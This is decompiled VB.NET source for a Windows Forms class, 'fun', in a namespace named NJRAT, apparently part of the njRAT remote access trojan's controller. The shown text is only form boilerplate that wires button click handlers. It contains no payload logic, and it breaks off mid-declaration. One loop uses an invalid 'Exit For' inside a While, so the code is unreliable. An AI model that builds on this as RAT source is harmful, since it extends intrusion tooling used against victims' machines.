Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My

Namespace NJRAT
	' Token: 0x02000013 RID: 19
	<DesignerGenerated()>
	Public Partial Class fun
		Inherits Form

		' Token: 0x06000200 RID: 512 RVA: 0x00159A2C File Offset: 0x00157E2C
		<DebuggerNonUserCode()>
		Public Sub New()
			fun.__ENCAddToList(Me)
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000201 RID: 513 RVA: 0x00159A44 File Offset: 0x00157E44
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = fun.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = fun.__ENCList.Count = fun.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = fun.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = fun.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								fun.__ENCList(num) = fun.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					fun.__ENCList.RemoveRange(num, fun.__ENCList.Count - num)
					fun.__ENCList.Capacity = fun.__ENCList.Count
				End If
				fun.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x170000B5 RID: 181
		' (get) Token: 0x06000204 RID: 516 RVA: 0x0015D940 File Offset: 0x0015BD40
		' (set) Token: 0x06000205 RID: 517 RVA: 0x0015D958 File Offset: 0x0015BD58
		Friend Overridable Property ImageList1 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._ImageList1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._ImageList1 = value
			End Set
		End Property

		' Token: 0x170000B6 RID: 182
		' (get) Token: 0x06000206 RID: 518 RVA: 0x0015D964 File Offset: 0x0015BD64
		' (set) Token: 0x06000207 RID: 519 RVA: 0x0015D97C File Offset: 0x0015BD7C
		Friend Overridable Property GroupBox7 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox7 = value
			End Set
		End Property

		' Token: 0x170000B7 RID: 183
		' (get) Token: 0x06000208 RID: 520 RVA: 0x0015D988 File Offset: 0x0015BD88
		' (set) Token: 0x06000209 RID: 521 RVA: 0x0015D9A0 File Offset: 0x0015BDA0
		Friend Overridable Property Button14 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button14
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button14_Click
				Dim flag As Boolean = Me._Button14 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button14.Click, value2
				End If
				Me._Button14 = value
				flag = (Me._Button14 IsNot Nothing)
				If flag Then
					AddHandler Me._Button14.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B8 RID: 184
		' (get) Token: 0x0600020A RID: 522 RVA: 0x0015DA00 File Offset: 0x0015BE00
		' (set) Token: 0x0600020B RID: 523 RVA: 0x0015DA18 File Offset: 0x0015BE18
		Friend Overridable Property Button15 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button15
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button15_Click
				Dim flag As Boolean = Me._Button15 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button15.Click, value2
				End If
				Me._Button15 = value
				flag = (Me._Button15 IsNot Nothing)
				If flag Then
					AddHandler Me._Button15.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000B9 RID: 185
		' (get) Token: 0x0600020C RID: 524 RVA: 0x0015DA78 File Offset: 0x0015BE78
		' (set) Token: 0x0600020D RID: 525 RVA: 0x0015DA90 File Offset: 0x0015BE90
		Friend Overridable Property GroupBox2 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox2 = value
			End Set
		End Property

		' Token: 0x170000BA RID: 186
		' (get) Token: 0x0600020E RID: 526 RVA: 0x0015DA9C File Offset: 0x0015BE9C
		' (set) Token: 0x0600020F RID: 527 RVA: 0x0015DAB4 File Offset: 0x0015BEB4
		Friend Overridable Property Button3 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button3_Click
				Dim flag As Boolean = Me._Button3 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button3.Click, value2
				End If
				Me._Button3 = value
				flag = (Me._Button3 IsNot Nothing)
				If flag Then
					AddHandler Me._Button3.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BB RID: 187
		' (get) Token: 0x06000210 RID: 528 RVA: 0x0015DB14 File Offset: 0x0015BF14
		' (set) Token: 0x06000211 RID: 529 RVA: 0x0015DB2C File Offset: 0x0015BF2C
		Friend Overridable Property Button4 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button4_Click
				Dim flag As Boolean = Me._Button4 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button4.Click, value2
				End If
				Me._Button4 = value
				flag = (Me._Button4 IsNot Nothing)
				If flag Then
					AddHandler Me._Button4.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BC RID: 188
		' (get) Token: 0x06000212 RID: 530 RVA: 0x0015DB8C File Offset: 0x0015BF8C
		' (set) Token: 0x06000213 RID: 531 RVA: 0x0015DBA4 File Offset: 0x0015BFA4
		Friend Overridable Property GroupBox8 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox8 = value
			End Set
		End Property

		' Token: 0x170000BD RID: 189
		' (get) Token: 0x06000214 RID: 532 RVA: 0x0015DBB0 File Offset: 0x0015BFB0
		' (set) Token: 0x06000215 RID: 533 RVA: 0x0015DBC8 File Offset: 0x0015BFC8
		Friend Overridable Property Button16 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button16
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button16_Click
				Dim flag As Boolean = Me._Button16 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button16.Click, value2
				End If
				Me._Button16 = value
				flag = (Me._Button16 IsNot Nothing)
				If flag Then
					AddHandler Me._Button16.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BE RID: 190
		' (get) Token: 0x06000216 RID: 534 RVA: 0x0015DC28 File Offset: 0x0015C028
		' (set) Token: 0x06000217 RID: 535 RVA: 0x0015DC40 File Offset: 0x0015C040
		Friend Overridable Property Button17 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button17
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button17_Click
				Dim flag As Boolean = Me._Button17 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button17.Click, value2
				End If
				Me._Button17 = value
				flag = (Me._Button17 IsNot Nothing)
				If flag Then
					AddHandler Me._Button17.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000BF RID: 191
		' (get) Token: 0x06000218 RID: 536 RVA: 0x0015DCA0 File Offset: 0x0015C0A0
		' (set) Token: 0x06000219 RID: 537 RVA: 0x0015DCB8 File Offset: 0x0015C0B8
		Friend Overridable Property GroupBox6 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox6 = value
			End Set
		End Property

		' Token: 0x170000C0 RID: 192
		' (get) Token: 0x0600021A RID: 538 RVA: 0x0015DCC4 File Offset: 0x0015C0C4
		' (set) Token: 0x0600021B RID: 539 RVA: 0x0015DCDC File Offset: 0x0015C0DC
		Friend Overridable Property Button22 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button22
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button22_Click
				Dim flag As Boolean = Me._Button22 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button22.Click, value2
				End If
				Me._Button22 = value
				flag = (Me._Button22 IsNot Nothing)
				If flag Then
					AddHandler Me._Button22.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000C1 RID: 193
		' (get) Token: 0x0600021C RID: 540 RVA: 0x0015DD3C File Offset: 0x0015C13C
		' (set) Token: 0x0600021D RID: 541 RVA: 0x0015DD54 File Offset: 0x0015C154
		Friend Overridable Property Button23 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button23
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button23_Click
				Dim flag As Boolean = Me._Button23 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button23.Click, value2
				End If
				Me._Button23 = value
				flag = (Me._Button23 IsNot Nothing)
				If flag Then
					AddHandler Me._Button23.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000C2 RID: 194
		' (get) Token: 0x0600021E RID: 542 RVA: 0x0015DDB4 File Offset: 0x0015C1B4
		' (set) Token: 0x0600021F RID: 543 RVA: 0x0015DDCC File Offset: 0x0015C1CC
		Friend Overridable Property GroupBox1 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox1 = value
			End Set
		End Property

		' Token: 0x170000C3 RID: 195
		' (get) Token: 0x06000220 RID: 544 RVA: 0x0015DDD8 File Offset: 0x0015C1D8
		' (set) Token: 0x06000221 RID: 545 RVA: 0x0015DDF0 File Offset: 0x0015C1F0
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000C4 RID: 196
		' (get) Token: 0x06000222 RID: 546 RVA: 0x0015DE50 File Offset: 0x0015C250
		' (set) Token: 0x06000223 RID: 547 RVA: 0x0015DE68 File Offset: 0x0015C268
		Friend Overridable Property Button2 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button2_Click
				Dim flag As Boolean = Me._Button2 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button2.Click, value2
				End If
				Me._Button2 = value
				flag = (Me._Button2 IsNot Nothing)
				If flag Then
					AddHandler Me._Button2.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000C5 RID: 197
		' (get) Token: 0x06000224 RID: 548 RVA: 0x0015DEC8 File Offset: 0x0015C2C8
		' (set) Token: 0x06000225 RID: 549 RVA: 0x0015DEE0 File Offset: 0x0015C2E0
		Friend Overridable Property GroupBox10 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox10
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox10 = value
			End Set
		End Property

		' Token: 0x170000C6 RID: 198
		' (get) Token: 0x06000226 RID: 550 RVA: 0x0015DEEC File Offset: 0x0015C2EC
		' (set) Token: 0x06000227 RID: 551 RVA: 0x0015DF04 File Offset: 0x0015C304
		Friend Overridable Property Button19 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button19
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button19_Click
				Dim flag As Boolean = Me._Button19 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button19.Click, value2
				End If
				Me._Button19 = value
				flag = (Me._Button19 IsNot Nothing)
				If flag Then
					AddHandler Me._Button19.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000C7 RID: 199
		' (get) Token: 0x06000228 RID: 552 RVA: 0x0015DF64 File Offset: 0x0015C364
		' (set) Token: 0x06000229 RID: 553 RVA: 0x0015DF7C File Offset: 0x0015C37C
		Friend Overridable Property Button18 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button18
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button18_Click
				Dim flag As Boolean = Me._Button18 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button18.Click, value2
				End If
				Me._Button18 = value
				flag = (Me._Button18 IsNot Nothing)
				If flag Then
					AddHandler Me._Button18.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000C8 RID: 200
		' (get) Token: 0x0600022A RID: 554 RVA: 0x0015DFDC File Offset: 0x0015C3DC
		' (set) Token: 0x0600022B RID: 555 RVA: 0x0015DFF4 File Offset: 0x0015C3F4
		Friend Overridable Property GroupBox9 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox9
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox9 = value
			End Set
		End Property

		' Token: 0x170000C9 RID: 201
		' (get) Token: 0x0600022C RID: 556 RVA: 0x0015E000 File Offset: 0x0015C400
		' (set) Token: 0x0600022D RID: 557 RVA: 0x0015E018 File Offset: 0x0015C418
		Friend Overridable Property Button12 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button12
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button12_Click
				Dim flag As Boolean = Me._Button12 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button12.Click, value2
				End If
				Me._Button12 = value
				flag = (Me._Button12 IsNot Nothing)
				If flag Then
					AddHandler Me._Button12.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000CA RID: 202
		' (get) Token: 0x0600022E RID: 558 RVA: 0x0015E078 File Offset: 0x0015C478
		' (set) Token: 0x0600022F RID: 559 RVA: 0x0015E090 File Offset: 0x0015C490
		Friend Overridable Property Button13 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button13
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button13_Click
				Dim flag As Boolean = Me._Button13 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button13.Click, value2
				End If
				Me._Button13 = value
				flag = (Me._Button13 IsNot Nothing)
				If flag Then
					AddHandler Me._Button13.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000CB RID: 203
		' (get) Token: 0x06000230 RID: 560 RVA: 0x0015E0F0 File Offset: 0x0015C4F0
		' (set) Token: 0x06000231 RID: 561 RVA: 0x0015E108 File Offset: 0x0015C508
		Friend Overridable Property GroupBox11 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox11
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox11 = value
			End Set
		End Property

		' Token: 0x170000CC RID: 204
		' (get) Token: 0x06000232 RID: 562 RVA: 0x0015E114 File Offset: 0x0015C514
		' (set) Token: 0x06000233 RID: 563 RVA: 0x0015E12C File Offset: 0x0015C52C
		Friend Overridable Property Button21 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button21
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button21_Click
				Dim flag As Boolean = Me._Button21 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button21.Click, value2
				End If
				Me._Button21 = value
				flag = (Me._Button21 IsNot Nothing)
				If flag Then
					AddHandler Me._Button21.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000CD RID: 205
		' (get) Token: 0x06000234 RID: 564 RVA: 0x0015E18C File Offset: 0x0015C58C
		' (set) Token: 0x06000235 RID: 565 RVA: 0x0015E1A4 File Offset: 0x0015C5A4
		Friend Overridable Property Button20 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button20
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button20_Click
				Dim flag As Boolean = Me._Button20 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button20.Click, value2
				End If
				Me._Button20 = value
				flag = (Me._Button20 IsNot Nothing)
				If flag Then
					AddHandler Me._Button20.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000CE RID: 206
		' (get) Token: 0x06000236 RID: 566 RVA: 0x0015E204 File Offset: 0x0015C604
		' (set) Token: 0x06000237 RID: 567 RVA: 0x0015E21C File Offset: 0x0015C61C
		Friend Overridable Property GroupBox25 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox25
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox25 = value
			End Set
		End Property

		' Token: 0x170000CF RID: 207
		' (get) Token: 0x06000238 RID: 568 RVA: 0x0015E228 File Offset: 0x0015C628
		' (set) Token: 0x06000239 RID: 569 RVA: 0x0015E240 File Offset: 0x0015C640
		Friend Overridable Property Button28 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button28
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button28_Click
				Dim flag As Boolean = Me._Button28 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button28.Click, value2
				End If
				Me._Button28 = value
				flag = (Me._Button28 IsNot Nothing)
				If flag Then
					AddHandler Me._Button28.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000D0 RID: 208
		' (get) Token: 0x0600023A RID: 570 RVA: 0x0015E2A0 File Offset: 0x0015C6A0
		' (set) Token: 0x0600023B RID: 571 RVA: 0x0015E2B8 File Offset: 0x0015C6B8
		Friend Overridable Property Button29 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button29
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button29_Click
				Dim flag As Boolean = Me._Button29 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button29.Click, value2
				End If
				Me._Button29 = value
				flag = (Me._Button29 IsNot Nothing)
				If flag Then
					AddHandler Me._Button29.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000D1 RID: 209
		' (get) Token: 0x0600023C RID: 572 RVA: 0x0015E318 File Offset: 0x0015C718
		' (set) Token: 0x0600023D RID: 573 RVA: 0x0015E330 File Offset: 0x0015C730
		Friend Overridable Property GroupBox19 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox19
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox19 = value
			End Set
		End Property

		' Token: 0x170000D2 RID: 210
		' (get) Token: 0x0600023E RID: 574 RVA: 0x0015E33C File Offset: 0x0015C73C
		' (set) Token: 0x0600023F RID: 575 RVA: 0x0015E354 File Offset: 0x0015C754
		Friend Overridable Property Button37 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button37
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button37_Click
				Dim flag As Boolean = Me._Button37 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button37.Click, value2
				End If
				Me._Button37 = value
				flag = (Me._Button37 IsNot Nothing)
				If flag Then
					AddHandler Me._Button37.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000D3 RID: 211
		' (get) Token: 0x06000240 RID: 576 RVA: 0x0015E3B4 File Offset: 0x0015C7B4
		' (set) Token: 0x06000241 RID: 577 RVA: 0x0015E3CC File Offset: 0x0015C7CC
		Friend Overridable Property Button36 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button36
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button36_Click
				Dim flag As Boolean = Me._Button36 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button36.Click, value2
				End If
				Me._Button36 = value
				flag = (Me._Button36 IsNot Nothing)
				If flag Then
					AddHandler Me._Button36.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000D4 RID: 212
		' (get) Token: 0x06000242 RID: 578 RVA: 0x0015E42C File Offset: 0x0015C82C
		' (set) Token: 0x06000243 RID: 579 RVA: 0x0015E444 File Offset: 0x0015C844
		Friend Overridable Property TextBox4 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox4 = value
			End Set
		End Property

		' Token: 0x170000D5 RID: 213
		' (get) Token: 0x06000244 RID: 580 RVA: 0x0015E450 File Offset: 0x0015C850
		' (set) Token: 0x06000245 RID: 581 RVA: 0x0015E468 File Offset: 0x0015C868
		Friend Overridable Property Button56 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button56
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button56_Click
				Dim flag As Boolean = Me._Button56 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button56.Click, value2
				End If
				Me._Button56 = value
				flag = (Me._Button56 IsNot Nothing)
				If flag Then
					AddHandler Me._Button56.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000D6 RID: 214
		' (get) Token: 0x06000246 RID: 582 RVA: 0x0015E4C8 File Offset: 0x0015C8C8
		' (set) Token: 0x06000247 RID: 583 RVA: 0x0015E4E0 File Offset: 0x0015C8E0
		Friend Overridable Property GroupBox18 As GroupBox
			<DebuggerNonUserCode()>
			Get
				Return Me._GroupBox18
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GroupBox)
				Me._GroupBox18 = value
			End Set
		End Property

		' Token: 0x170000D7 RID: 215
		' (get) Token: 0x06000248 RID: 584 RVA: 0x0015E4EC File Offset: 0x0015C8EC
		' (set) Token: 0x06000249 RID: 585 RVA: 0x0015E504 File Offset: 0x0015C904
		Friend Overridable Property Button40 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button40
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button40_Click
				Dim flag As Boolean = Me._Button40 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button40.Click, value2
				End If
				Me._Button40 = value
				flag = (Me._Button40 IsNot Nothing)
				If flag Then
					AddHandler Me._Button40.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000D8 RID: 216
		' (get) Token: 0x0600024A RID: 586 RVA: 0x0015E564 File Offset: 0x0015C964
		' (set) Token: 0x0600024B RID: 587 RVA: 0x0015E57C File Offset: 0x0015C97C
		Friend Overridable Property Button41 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button41
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button41_Click
				Dim flag As Boolean = Me._Button41 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button41.Click, value2
				End If
				Me._Button41 = value
				flag = (Me._Button41 IsNot Nothing)
				If flag Then
					AddHandler Me._Button41.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000D9 RID: 217
		' (get) Token: 0x0600024C RID: 588 RVA: 0x0015E5DC File Offset: 0x0015C9DC
		' (set) Token: 0x0600024D RID: 589 RVA: 0x0015E5F4 File Offset: 0x0015C9F4
		Friend Overridable Property Button42 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button42
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button42_Click
				Dim flag As Boolean = Me._Button42 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button42.Click, value2
				End If
				Me._Button42 = value
				flag = (Me._Button42 IsNot Nothing)
				If flag Then
					AddHandler Me._Button42.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DA RID: 218
		' (get) Token: 0x0600024E RID: 590 RVA: 0x0015E654 File Offset: 0x0015CA54
		' (set) Token: 0x0600024F RID: 591 RVA: 0x0015E66C File Offset: 0x0015CA6C
		Friend Overridable Property Button43 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button43
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button43_Click
				Dim flag As Boolean = Me._Button43 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button43.Click, value2
				End If
				Me._Button43 = value
				flag = (Me._Button43 IsNot Nothing)
				If flag Then
					AddHandler Me._Button43.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DB RID: 219
		' (get) Token: 0x06000250 RID: 592 RVA: 0x0015E6CC File Offset: 0x0015CACC
		' (set) Token: 0x06000251 RID: 593 RVA: 0x0015E6E4 File Offset: 0x0015CAE4
		Friend Overridable Property Button44 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button44
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button44_Click
				Dim flag As Boolean = Me._Button44 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button44.Click, value2
				End If
				Me._Button44 = value
				flag = (Me._Button44 IsNot Nothing)
				If flag Then
					AddHandler Me._Button44.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DC RID: 220
		' (get) Token: 0x06000252 RID: 594 RVA: 0x0015E744 File Offset: 0x0015CB44
		' (set) Token: 0x06000253 RID: 595 RVA: 0x0015E75C File Offset: 0x0015CB5C
		Friend Overridable Property Button45 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button45
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button45_Click
				Dim flag As Boolean = Me._Button45 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button45.Click, value2
				End If
				Me._Button45 = value
				flag = (Me._Button45 IsNot Nothing)
				If flag Then
					AddHandler Me._Button45.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DD RID: 221
		' (get) Token: 0x06000254 RID: 596 RVA: 0x0015E7BC File Offset: 0x0015CBBC
		' (set) Token: 0x06000255 RID: 597 RVA: 0x0015E7D4 File Offset: 0x0015CBD4
		Friend Overridable Property Button46 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button46
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button46_Click
				Dim flag As Boolean = Me._Button46 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button46.Click, value2
				End If
				Me._Button46 = value
				flag = (Me._Button46 IsNot Nothing)
				If flag Then
					AddHandler Me._Button46.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170000DE RID: 222
		' (get) Token: 0x06000256 RID: 598 RVA: 0x0015E834 File Offset: 0x0015CC34
		' (set) Token: 0x06000257 RID: 599 RVA: 0x0015E84C File Offset: 0x0015CC4C
